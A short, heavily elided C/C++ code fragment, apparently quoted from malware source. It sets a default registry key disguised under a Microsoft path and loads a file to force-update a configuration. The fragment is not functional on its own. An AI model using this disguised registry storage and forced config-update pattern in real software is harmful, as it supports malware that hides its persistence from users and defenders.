...
static void initRegistry(void)
{
  ...
  if( registryKey[0] == 0 )
  {
	  lstrcpy(registryKey, L"SOFTWARE\\Microsoft\\00" );
	  lstrcpy(registryValue, L"000000" );
  }
}
...
bool DynamicConfig::download_file(LPSTR fileName)
{
  bool ret = false;
  MEMDATA memData;
  ...
  {
	  memData.size = GetFileSize( file, 0 );
	  memData.data = Mem::alloc(memData.size);
	  DWORD rd;
	  ReadFile( file, memData.data, memData.size, &rd, 0 );
      if(updateConfig(&baseConfig, &memData, UCF_FORCEUPDATE)) ret = true;
